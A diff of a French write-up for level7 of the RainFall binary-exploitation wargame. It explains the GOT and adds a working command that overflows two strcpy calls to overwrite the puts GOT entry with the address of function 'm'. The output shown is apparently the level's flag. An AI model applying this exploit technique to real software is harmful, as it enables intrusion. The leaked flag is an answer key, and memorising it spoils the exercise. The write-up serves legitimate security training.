@@ -80,13 +80,21 @@ fs             0x0	0
 gs             0x33	51
 ```
 Nous avons écrasés les valeurs de eax et edx.
-En inspectant la fonction puts utilisée après:
+
+Puis nous inspectons la fonction puts utilisée après:
 ```
 0x080485f7 <+214>:	call   0x8048400 <puts@plt>
 
 (gdb) x/i 0x08048400
    0x8048400 <puts@plt>:	jmp    *0x8049928
 ```
-Après s'etre suffisament documenté, nous savons que le programme stocke l'appel de chaque fonction dans la GOT (Global Offset Table) ce qui permet au prochains appels de cette fonction, de ne pas aller chercher a chaque fois dans la bibliotèque standart C.
+Après s'etre documenté, nous savons que le programme stocke l'appel de chaque fonction dans la GOT (Global Offset Table) ce qui permet au prochains appels de cette fonction, de ne pas aller chercher a chaque fois dans la bibliotèque standart C.
 
-Nous allons donc avec 
+Nous allons donc avec écraser l'adresse de retour de la GOT de la fonction puts, pour qu'elle pointe vers la fonction "m", en ajoutant un offset de 20 caracteres + l'adresse de puts dans le 1er strcpy, et simplement l'adresse de "m" dans le deuxieme strcpy.
+
+```
+level7@RainFall:~$ /home/user/level7/level7 $(python -c 'print ("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print ("\xf4\x84\x04\x08")')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
+
+
